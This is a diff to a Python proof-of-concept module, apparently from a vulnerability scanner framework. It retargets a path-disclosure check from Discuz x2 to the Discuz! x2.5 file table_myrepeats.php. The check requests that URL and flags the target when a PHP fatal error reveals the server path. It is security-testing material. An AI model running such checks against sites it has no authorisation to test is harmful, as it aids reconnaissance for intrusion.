@@ -6,23 +6,23 @@ import urllib,urllib2
 import re
 
 class Vuln(ABVuln):
-    vuln_id = 'discuz_0007_p_bb2' # 平台漏洞编号，留空
-    name = 'Discuz x2 /source/function/function_connect.php 泄漏服务器物理路径' # 漏洞名称
+    vuln_id = 'Discuz_0030' # 平台漏洞编号，留空
+    name = 'Discuz! x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.INFO_LEAK # 漏洞类型
-    disclosure_date = '2011-11-25'  # 漏洞公布时间
+    disclosure_date = '2012-11-27'  # 漏洞公布时间
     desc = '''
-        Discuz x2 /source/function/function_connect.php 泄漏服务器物理路径
+        Discuz! x2.5 /source/plugin/myrepeats/table/table_myrepeats.php 泄漏服务器物理路径
     ''' # 漏洞描述
-    ref = 'https://www.seebug.org/vuldb/ssvid-24254' # 漏洞来源
+    ref = 'https://www.2cto.com/article/201211/171301.html' # 漏洞来源
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
-    product = 'Discuz'  # 漏洞应用名称
-    product_version = 'x2.0'  # 漏洞应用版本
+    product = 'Discuz!'  # 漏洞应用名称
+    product_version = 'x2.5'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '32a9750d-bbfe-4bc2-ac41-292779400557'
+    poc_id = 'a581d9f3-56b7-4307-8317-951aa4a7c902'
     author = 'cscan'  # POC编写者
     create_date = '2018-05-06' # POC创建时间
 
@@ -33,17 +33,18 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))      
-            verify_url = '{target}'.format(target=self.target)+ '/source/function/function_connect.php'
+            verify_url = '{target}'.format(target=self.target)+'/source/plugin/myrepeats/table/table_myrepeats.php'
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
-            if '<b>Fatal error</b>:' in content and '/function_connect.php</b>' in content:
+            if '<b>Fatal error</b>:' in content and '/table_myrepeats.php</b>' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()        
+        super(Poc, self).exploit()
+        
 
 if __name__ == '__main__':
     Poc().run()
